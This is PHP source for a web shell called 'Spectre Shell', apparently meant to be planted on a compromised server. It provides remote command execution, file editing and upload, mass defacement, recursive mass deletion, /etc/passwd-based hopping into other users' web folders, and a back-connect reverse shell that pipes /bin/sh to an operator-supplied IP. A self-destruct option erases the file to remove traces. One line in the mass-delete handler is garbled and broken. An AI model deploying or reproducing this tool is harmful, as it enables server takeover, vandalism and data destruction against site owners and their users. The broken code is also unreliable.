<?php
/*
 * =======================================================
 * |                 DEBUG MODE ACTIVATED                  |
 * | These lines force the server to show the exact error. |
 * | REMOVE THESE LINES once the shell is working.         |
 * =======================================================
 */
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
// --- END OF DEBUG BLOCK ---


/*
 * Spectre Shell v1.0
 * A refined mini-shell for the discerning operator.
 */
session_start();
set_time_limit(0);
// error_reporting(0); // We disable this for debugging
// @ini_set('display_errors', 0); // We disable this for debugging

class SpectreShell
{
    // !!! PENTING: GANTI PASSWORD INI DENGAN HASH SHA256 ANDA SENDIRI !!!
    // Ganti 'rahasia' dengan password Anda. Anda bisa generate hash di situs online.
    private $passwordHash = '8b44458f4534714652c4620577381283303b64c015707775952f44a428230678'; // sha256('rahasia')

    private $path;
    private $self;

    public function __construct()
    {
        $this->self = basename(__FILE__);
        if (!$this->isAuthenticated()) {
            $this->handleLogin();
        }
        $this->path = $this->getPath();
    }

    public function run()
    {
        if (isset($_GET['action']) && $_GET['action'] == 'logout') {
            session_destroy();
            header("Location: {$this->self}");
            exit;
        }

        if (isset($_GET['action']) && $_GET['action'] == 'self-destruct') {
            if (unlink($this->self)) {
                session_destroy();
                die('<!DOCTYPE html><html><head><title>Mission Accomplished</title><style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;}h1{text-shadow:0 0 5px #0f0;}</style></head><body><h1>SELF-DESTRUCT SUCCESSFUL.</h1><p>The file has been erased. All traces removed.</p></body></html>');
            } else {
                $this->renderPage('Self-Destruct', '<div class="alert error">Failed to self-destruct. Remove the file manually.</div>');
            }
            exit;
        }

        $action = $_GET['action'] ?? 'files';
        $content = '';

        switch ($action) {
            case 'cmd':
                $content = $this->renderCmd();
                break;
            case 'upload':
                $content = $this->handleUpload();
                break;
            case 'mass_deface':
                $content = $this->handleMassDeface();
                break;
            case 'mass_delete':
                $content = $this->handleMassDelete();
                break;
            case 'jumping':
                $content = $this->handleJumping();
                break;
            case 'back_connect':
                $content = $this->handleBackConnect();
                break;
            default:
                $content = $this->renderFileManager();
        }
        $this->renderPage($this->getNavTitle($action), $content);
    }

    private function isAuthenticated()
    {
        return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
    }

    private function handleLogin()
    {
        if (isset($_POST['password'])) {
            if (hash('sha256', $_POST['password']) === $this->passwordHash) {
                $_SESSION['authenticated'] = true;
                header("Location: {$this->self}");
                exit;
            } else {
                $this->renderLoginPage("Invalid credentials.");
            }
        } else {
            $this->renderLoginPage();
        }
        exit;
    }

    private function getPath()
    {
        $path = $_GET['path'] ?? getcwd();
        return str_replace('\\', '/', realpath($path));
    }

    private function renderLoginPage($error = null)
    {
        $errorHtml = $error ? "<div class='alert error'>$error</div>" : "";
        die('
        <!DOCTYPE html><html><head><title>Spectre Shell - Access Denied</title>
        <style>
            body{background:#1a1a1a;color:#e0e0e0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
            .login-box{background:#2a2a2a;padding:40px;border:1px solid #444;border-radius:5px;box-shadow:0 0 20px rgba(0,255,0,0.1);width:300px;text-align:center;}
            h1{color:#00ff00;margin-top:0;text-shadow:0 0 5px #00ff00;}
            input[type="password"]{width:100%;padding:10px;background:#1a1a1a;border:1px solid #444;color:#e0e0e0;border-radius:3px;margin-bottom:15px;box-sizing:border-box;}
            input[type="submit"]{width:100%;padding:10px;background:#009900;border:none;color:#fff;font-weight:bold;cursor:pointer;border-radius:3px;transition:background 0.2s;}
            input[type="submit"]:hover{background:#00ff00;}
            .alert.error{color:#ff4d4d;background:#442222;padding:10px;border:1px solid #ff4d4d;border-radius:3px;margin-bottom:15px;}
        </style>
        </head><body>
            <div class="login-box">
                <h1>SPECTRE SHELL</h1>
                ' . $errorHtml . '
                <form method="post">
                    <input type="password" name="password" placeholder="Enter Passphrase" autofocus>
                    <input type="submit" value="Authenticate">
                </form>
            </div>
        </body></html>');
    }

    private function renderPage($title, $content)
    {
        $serverInfo = $this->getServerInfo();
        $pathBreadcrumbs = $this->getPathBreadcrumbs();
        echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>Spectre Shell - {$title}</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root { --bg-color: #1a1a1a; --text-color: #e0e0e0; --primary-color: #00ff00; --secondary-color: #333; --border-color: #444; --hover-bg: #2a2a2a; }
        body { background: var(--bg-color); color: var(--text-color); font-family: 'Droid Sans Mono', monospace; margin: 0; padding: 20px; }
        a { color: var(--primary-color); text-decoration: none; }
        a:hover { text-decoration: underline; }
        .container { max-width: 1200px; margin: 0 auto; }
        header, footer { background: var(--secondary-color); padding: 15px; border: 1px solid var(--border-color); border-radius: 5px; margin-bottom: 20px; }
        header h1 { margin: 0; color: var(--primary-color); text-shadow: 0 0 5px var(--primary-color); font-size: 24px; text-align: center; }
        .server-info { font-size: 12px; word-wrap: break-word; text-align: center; margin-top: 10px; }
        .path-bar { background: var(--secondary-color); padding: 10px; border-radius: 3px; margin-bottom: 20px; font-size: 14px; }
        nav { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; }
        nav a { display: block; padding: 10px 15px; background: var(--secondary-color); border-radius: 3px; transition: background 0.2s; border: 1px solid var(--border-color); }
        nav a:hover, nav a.active { background: var(--hover-bg); color: #fff; }
        nav a.danger { color: #ff4d4d; }
        nav a.danger:hover { background: #442222; }
        .content-box { background: var(--secondary-color); padding: 20px; border: 1px solid var(--border-color); border-radius: 5px; }
        .content-box h2 { margin-top: 0; color: var(--primary-color); border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
        .table { width: 100%; border-collapse: collapse; }
        .table th, .table td { padding: 10px; text-align: left; border-bottom: 1px solid var(--border-color); }
        .table th { background: var(--hover-bg); }
        .table tr:hover td { background: var(--hover-bg); }
        .table td a { display: block; }
        .perms { font-family: monospace; }
        .perms.writable { color: var(--primary-color); }
        .perms.not-readable { color: #ff4d4d; }
        .actions-form select, .actions-form input { background: var(--bg-color); color: var(--text-color); border: 1px solid var(--border-color); padding: 5px; border-radius: 3px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; }
        .form-group input[type="text"], .form-group input[type="file"], .form-group textarea { width: 100%; padding: 10px; background: var(--bg-color); border: 1px solid var(--border-color); color: var(--text-color); border-radius: 3px; box-sizing: border-box; }
        .form-group textarea { height: 200px; resize: vertical; }
        .btn { padding: 10px 15px; background: #009900; border: none; color: #fff; font-weight: bold; cursor: pointer; border-radius: 3px; transition: background 0.2s; }
        .btn:hover { background: var(--primary-color); }
        .alert { padding: 15px; border-radius: 3px; margin-bottom: 20px; border: 1px solid; }
        .alert.success { background: #224422; color: #adffad; border-color: #adffad; }
        .alert.error { background: #442222; color: #ff9999; border-color: #ff4d4d; }
        #terminal { background: #000; color: #0f0; padding: 10px; height: 400px; overflow-y: scroll; font-family: monospace; border: 1px solid var(--border-color); border-radius: 3px; white-space: pre-wrap; word-wrap: break-word; }
        #cmd-input { display: flex; margin-top: 10px; }
        #cmd-input input { flex-grow: 1; background: #000; border: 1px solid var(--border-color); color: #0f0; padding: 10px; border-radius: 3px 0 0 3px; }
    </style>
</head>
<body>
<div class="container">
    <header>
        <h1>SPECTRE SHELL</h1>
        <div class="server-info">{$serverInfo}</div>
    </header>
    
    <div class="path-bar">Current Path: {$pathBreadcrumbs}</div>
    
    <nav>
        <a href="?path={$this->path}&action=files" class="{$this->isActive('files')}">File Manager</a>
        <a href="?path={$this->path}&action=cmd" class="{$this->isActive('cmd')}">Terminal</a>
        <a href="?path={$this->path}&action=upload" class="{$this->isActive('upload')}">Upload</a>
        <a href="?path={$this->path}&action=mass_deface" class="{$this->isActive('mass_deface')}">Mass Deface</a>
        <a href="?path={$this->path}&action=mass_delete" class="{$this->isActive('mass_delete')}">Mass Delete</a>
        <a href="?path={$this->path}&action=jumping" class="{$this->isActive('jumping')}">Jumping</a>
        <a href="?path={$this->path}&action=back_connect" class="{$this->isActive('back_connect')}">Back-Connect</a>
        <a href="?action=logout">Logout</a>
        <a href="?action=self-destruct" class="danger" onclick="return confirm('WARNING: This will permanently delete the shell file. Are you sure?')">Self-Destruct</a>
    </nav>

    <div class="content-box">
        <h2>{$title}</h2>
        {$content}
    </div>

    <footer>
        <p style="text-align:center; font-size:12px;">Spectre Shell v1.0 © 2024 - Operate with precision.</p>
    </footer>
</div>
<script>
    const cmdForm = document.getElementById('cmd-form');
    if (cmdForm) {
        cmdForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const commandInput = document.getElementById('command');
            const terminalOutput = document.getElementById('terminal');
            const command = commandInput.value;
            terminalOutput.innerHTML += '\\n<span style="color:#00ff00;">> ' + command + '</span>\\n';
            commandInput.value = '';

            fetch('', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'ajax_cmd=' + encodeURIComponent(command) + '&path=' + encodeURIComponent('{$this->path}')
            })
            .then(response => response.text())
            .then(text => {
                terminalOutput.innerHTML += text.replace(/\\n/g, '<br>');
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            });
        });
    }
</script>
</body>
</html>
HTML;
    }

    private function getServerInfo()
    {
        $uname = php_uname();
        $serverIp = gethostbyname($_SERVER['HTTP_HOST']);
        $yourIp = $_SERVER['REMOTE_ADDR'];
        $user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
        return "<b>OS:</b> {$uname}<br><b>Server IP:</b> {$serverIp} | <b>Your IP:</b> {$yourIp} | <b>User:</b> {$user}";
    }

    private function getPathBreadcrumbs()
    {
        $parts = explode('/', $this->path);
        $crumbs = [];
        $current = '';
        foreach ($parts as $part) {
            if (empty($part) && count($crumbs) > 0) continue;
            $current .= $part . '/';
            $crumbs[] = "<a href='?path={$current}'>" . ($part ?: '/') . "</a>";
        }
        return implode('', $crumbs);
    }
    
    private function isActive($action) {
        return ($_GET['action'] ?? 'files') === $action ? 'active' : '';
    }

    private function getNavTitle($action) {
        $titles = [
            'files' => 'File Manager', 'cmd' => 'Command Executor', 'upload' => 'File Uploader',
            'mass_deface' => 'Mass Defacer', 'mass_delete' => 'Mass Deleter',
            'jumping' => 'User Jumping', 'back_connect' => 'Back-Connect'
        ];
        return $titles[$action] ?? 'File Manager';
    }

    private function perms($file) {
        $perms = fileperms($file);
        $info = 'u';
        if (($perms & 0xC000) == 0xC000) $info = 's';
        elseif (($perms & 0xA000) == 0xA000) $info = 'l';
        elseif (($perms & 0x8000) == 0x8000) $info = '-';
        elseif (($perms & 0x6000) == 0x6000) $info = 'b';
        elseif (($perms & 0x4000) == 0x4000) $info = 'd';
        elseif (($perms & 0x2000) == 0x2000) $info = 'c';
        elseif (($perms & 0x1000) == 0x1000) $info = 'p';
        $info .= (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
        $info .= (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
        $info .= (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
        return $info;
    }
    
    private function hdd($s) {
       if($s >= 1073741824) return sprintf('%1.2f',$s / 1073741824 ).' GB';
       elseif($s >= 1048576) return sprintf('%1.2f',$s / 1048576 ) .' MB';
       elseif($s >= 1024) return sprintf('%1.2f',$s / 1024 ) .' KB';
       else return $s .' B';
    }

    private function executeCommand($cmd) {
        $output = '';
        if (function_exists('shell_exec')) {
            $output = shell_exec($cmd);
        } elseif (function_exists('exec')) {
            exec($cmd, $output);
            $output = implode("\n", $output);
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            passthru($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } elseif (is_resource($proc = proc_open($cmd, [['pipe','r'],['pipe','w'],['pipe','w']], $pipes))) {
            $output = stream_get_contents($pipes[1]);
            proc_close($proc);
        }
        return htmlspecialchars($output);
    }

    // --- Action Handlers ---

    private function renderFileManager()
    {
        // Handle actions: edit, rename, chmod, delete
        $alert = '';
        if (isset($_POST['action_opt'])) {
            $opt = $_POST['action_opt'];
            $targetPath = $_POST['target_path'];
            $targetName = $_POST['target_name'];
            $targetType = $_POST['target_type'];

            if ($opt == 'delete') {
                if ($targetType == 'dir') {
                    if (@rmdir($targetPath)) $alert = "<div class='alert success'>Directory '{$targetName}' deleted.</div>";
                    else $alert = "<div class='alert error'>Failed to delete directory '{$targetName}'. Not empty or no permission.</div>";
                } else {
                    if (@unlink($targetPath)) $alert = "<div class='alert success'>File '{$targetName}' deleted.</div>";
                    else $alert = "<div class='alert error'>Failed to delete file '{$targetName}'.</div>";
                }
            } elseif ($opt == 'rename' && isset($_POST['new_name'])) {
                if (@rename($targetPath, $this->path . '/' . $_POST['new_name'])) $alert = "<div class='alert success'>Renamed '{$targetName}' to '{$_POST['new_name']}'.</div>";
                else $alert = "<div class='alert error'>Failed to rename.</div>";
            } elseif ($opt == 'chmod' && isset($_POST['perms'])) {
                if (@chmod($targetPath, octdec($_POST['perms']))) $alert = "<div class='alert success'>Permissions changed for '{$targetName}'.</div>";
                else $alert = "<div class='alert error'>Failed to change permissions.</div>";
            } elseif ($opt == 'edit' && isset($_POST['content'])) {
                if (@file_put_contents($targetPath, $_POST['content']) !== false) $alert = "<div class='alert success'>File '{$targetName}' saved.</div>";
                else $alert = "<div class='alert error'>Failed to save file '{$targetName}'.</div>";
            }
        }
        
        // Render edit/rename/chmod forms
        if (isset($_GET['opt_view'])) {
            $opt = $_GET['opt_view'];
            $targetPath = $_GET['target'];
            $targetName = basename($targetPath);
            $form = '';
            if ($opt == 'edit' && is_file($targetPath)) {
                $content = htmlspecialchars(file_get_contents($targetPath));
                $form = "<h3>Editing: {$targetName}</h3><form method='post'><textarea name='content' class='form-group' style='height:400px;'>{$content}</textarea><input type='hidden' name='action_opt' value='edit'><input type='hidden' name='target_path' value='{$targetPath}'><input type='hidden' name='target_name' value='{$targetName}'><input type='submit' value='Save Changes' class='btn'></form>";
            } elseif ($opt == 'rename') {
                 $form = "<h3>Renaming: {$targetName}</h3><form method='post' class='form-group'><input type='text' name='new_name' value='{$targetName}'><input type='hidden' name='action_opt' value='rename'><input type='hidden' name='target_path' value='{$targetPath}'><input type='hidden' name='target_name' value='{$targetName}'><input type='submit' value='Rename' class='btn'></form>";
            } elseif ($opt == 'chmod') {
                $perms = substr(sprintf('%o', fileperms($targetPath)), -4);
                $form = "<h3>Chmod: {$targetName}</h3><form method='post' class='form-group'><input type='text' name='perms' value='{$perms}'><input type='hidden' name='action_opt' value='chmod'><input type='hidden' name='target_path' value='{$targetPath}'><input type='hidden' name='target_name' value='{$targetName}'><input type='submit' value='Set Permissions' class='btn'></form>";
            }
            return $alert . $form;
        }

        // Render file list
        $files = scandir($this->path);
        $dirsHtml = '';
        $filesHtml = '';

        foreach ($files as $file) {
            if ($file == '.' || ($file == '..' && $this->path == '/')) continue;
            
            $fullPath = $this->path . '/' . $file;
            $isDir = is_dir($fullPath);
            $perms = $this->perms($fullPath);
            $permClass = is_writable($fullPath) ? 'writable' : (is_readable($fullPath) ? '' : 'not-readable');
            $size = $isDir ? '[DIR]' : $this->hdd(filesize($fullPath));
            
            $actions = "
                <a href='?path={$this->path}&opt_view=rename&target={$fullPath}'>Rename</a> |
                <a href='?path={$this->path}&opt_view=chmod&target={$fullPath}'>Chmod</a> |
                <form method='post' style='display:inline;' onsubmit=\"return confirm('Delete permanently?');\">
                    <input type='hidden' name='action_opt' value='delete'>
                    <input type='hidden' name='target_path' value='{$fullPath}'>
                    <input type='hidden' name='target_name' value='{$file}'>
                    <input type='hidden' name='target_type' value='".($isDir ? 'dir' : 'file')."'>
                    <button type='submit' style='background:none;border:none;color:var(--primary-color);cursor:pointer;padding:0;font-family:inherit;font-size:inherit;'>Delete</button>
                </form>
            ";
            if (!$isDir) {
                 $actions = "<a href='?path={$this->path}&opt_view=edit&target={$fullPath}'>Edit</a> | " . $actions;
            }

            $link = $isDir ? "<a href='?path={$fullPath}'>{$file}</a>" : "<span>{$file}</span>";
            $row = "<tr><td>{$link}</td><td>{$size}</td><td><span class='perms {$permClass}'>{$perms}</span></td><td>{$actions}</td></tr>";
            
            if ($isDir) $dirsHtml .= $row;
            else $filesHtml .= $row;
        }

        return $alert . "<table class='table'><thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Actions</th></tr></thead><tbody>{$dirsHtml}{$filesHtml}</tbody></table>";
    }

    private function renderCmd()
    {
        // AJAX handler for commands
        if (isset($_POST['ajax_cmd'])) {
            $cmd = $_POST['ajax_cmd'];
            $path = $_POST['path'] ?? $this->path;
            chdir($path);
            echo $this->executeCommand($cmd);
            exit;
        }
        
        return '<div id="terminal">[Spectre Terminal] Ready.</div><form id="cmd-form"><div id="cmd-input"><span style="padding:10px;background:#000;color:#0f0;">$ </span><input type="text" id="command" autocomplete="off" autofocus></div></form>';
    }

    private function handleUpload()
    {
        $alert = '';
        if (isset($_FILES['file'])) {
            if (copy($_FILES['file']['tmp_name'], $this->path . '/' . $_FILES['file']['name'])) {
                $alert = "<div class='alert success'>File '{$_FILES['file']['name']}' uploaded successfully.</div>";
            } else {
                $alert = "<div class='alert error'>Upload failed. Check permissions.</div>";
            }
        }
        $form = "<form enctype='multipart/form-data' method='post'>
            <div class='form-group'><label for='file'>Select File to Upload:</label><input type='file' name='file' id='file'></div>
            <input type='submit' value='Upload' class='btn'>
        </form>";
        return $alert . $form;
    }

    private function handleMassDeface()
    {
        $result = '';
        if (isset($_POST['start_deface'])) {
            $dir = $_POST['target_dir'];
            $filename = $_POST['filename'];
            $content = $_POST['content'];
            $count = 0;
            try {
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS));
                foreach ($iterator as $file) {
                    if ($file->isDir()) {
                        $newFilePath = $file->getRealPath() . '/' . $filename;
                        if (is_writable($file->getRealPath()) && @file_put_contents($newFilePath, $content)) {
                            $result .= "SUCCESS: {$newFilePath}<br>";
                            $count++;
                        } else {
                            $result .= "FAILED: {$newFilePath} (Permission Denied)<br>";
                        }
                    }
                }
                // Also in root of target dir
                $rootFilePath = $dir . '/' . $filename;
                if(is_writable($dir) && @file_put_contents($rootFilePath, $content)){
                    $result .= "SUCCESS: {$rootFilePath}<br>";
                    $count++;
                }
                 $result = "<div class='alert success'>Mass deface complete. {$count} files created.</div><pre>{$result}</pre>";
            } catch (Exception $e) {
                $result = "<div class='alert error'>Error: " . $e->getMessage() . "</div>";
            }
        }
        $form = "<form method='post'>
            <div class='form-group'><label>Target Directory:</label><input type='text' name='target_dir' value='{$this->path}'></div>
            <div class='form-group'><label>Filename (e.g., index.html):</label><input type='text' name='filename' value='index.html'></div>
            <div class='form-group'><label>File Content (Deface Script):</label><textarea name='content'>Hacked by Spectre</textarea></div>
            <input type='submit' name='start_deface' value='Start Mass Deface' class='btn' onclick=\"return confirm('This will create files recursively. Are you sure?');\">
        </form>";
        return $result . $form;
    }

    private function handleMassDelete()
    {
        $result = '';
        if (isset($_POST['start_delete'])) {
            $dir = $_POST['target_dir'];
            $filename = $_POST['filename'];
            $count = 0;
            try {
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($iterator as $file) {
                    if ($file->isFile() && $file->getFilename() == $filename) {
                        if (@unlink($file->getRealPath())) {
                            $result .= "DELETED: {$file->getRealPath()}<br>";
                            $count++;
                        } else {
                            $result .= "FAILED: {$file->getRealPath()}<br>";
is_writable($dir) &&                     }
                    }
                }
                $result = "<div class='alert success'>Mass delete complete. {$count} files removed.</div><pre>{$result}</pre>";
            } catch (Exception $e) {
                $result = "<div class='alert error'>Error: " . $e->getMessage() . "</div>";
            }
        }
        $form = "<form method='post'>
            <div class='form-group'><label>Target Directory:</label><input type='text' name='target_dir' value='{$this->path}'></div>
            <div class='form-group'><label>Filename to Delete:</label><input type='text' name='filename' value='index.html'></div>
            <input type='submit' name='start_delete' value='Start Mass Delete' class='btn' onclick=\"return confirm('This will delete files recursively. Are you sure?');\">
        </form>";
        return $result . $form;
    }
    
    private function handleJumping() {
        $output = '';
        if (!is_readable('/etc/passwd')) {
            return "<div class='alert error'>Cannot read /etc/passwd. Function disabled.</div>";
        }
        $users = file('/etc/passwd');
        $output .= "<table class='table'><thead><tr><th>User</th><th>Home Directory</th><th>Status</th></tr></thead><tbody>";
        foreach ($users as $user) {
            $parts = explode(':', $user);
            $username = $parts[0];
            $homeDir = $parts[5];
            if (strpos($homeDir, '/home/') !== false && is_dir($homeDir)) {
                 $publicHtml = $homeDir . '/public_html';
                 if (is_readable($publicHtml)) {
                     $status = is_writable($publicHtml) ? "<span class='perms writable'>RW</span>" : "<span style='color:yellow'>R</span>";
                     $output .= "<tr><td>{$username}</td><td><a href='?path={$publicHtml}'>{$publicHtml}</a></td><td>{$status}</td></tr>";
                 }
            }
        }
        $output .= "</tbody></table>";
        return $output;
    }
    
    private function handleBackConnect() {
         $result = '';
        if (isset($_POST['ip']) && isset($_POST['port'])) {
            $ip = $_POST['ip'];
            $port = (int)$_POST['port'];
            $shell = 'uname -a; w; id; /bin/sh -i';
            
            if (function_exists('fsockopen')) {
                $sock = fsockopen($ip, $port);
                if ($sock) {
                    fwrite($sock, "CONNECTED!\n");
                    stream_set_blocking($sock, 0);
                    $proc = proc_open($shell, [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
                    $result = "<div class='alert success'>Back-connect initiated to {$ip}:{$port}. Check your listener.</div>";
                } else {
                    $result = "<div class='alert error'>fsockopen failed.</div>";
                }
            } else {
                $result = "<div class='alert error'>fsockopen is disabled.</div>";
            }
        }
        
        $yourIp = $_SERVER['REMOTE_ADDR'];
        $form = "<p>This will attempt to connect back to your machine. Start a listener first (e.g., <code>nc -lvp 4444</code>).</p>
        <form method='post'>
            <div class='form-group'><label>Your IP:</label><input type='text' name='ip' value='{$yourIp}'></div>
            <div class='form-group'><label>Your Port:</label><input type='text' name='port' value='4444'></div>
            <input type='submit' value='Connect Back' class='btn'>
        </form>";
        return $result . $form;
    }
}

$shell = new SpectreShell();
$shell->run();

?>
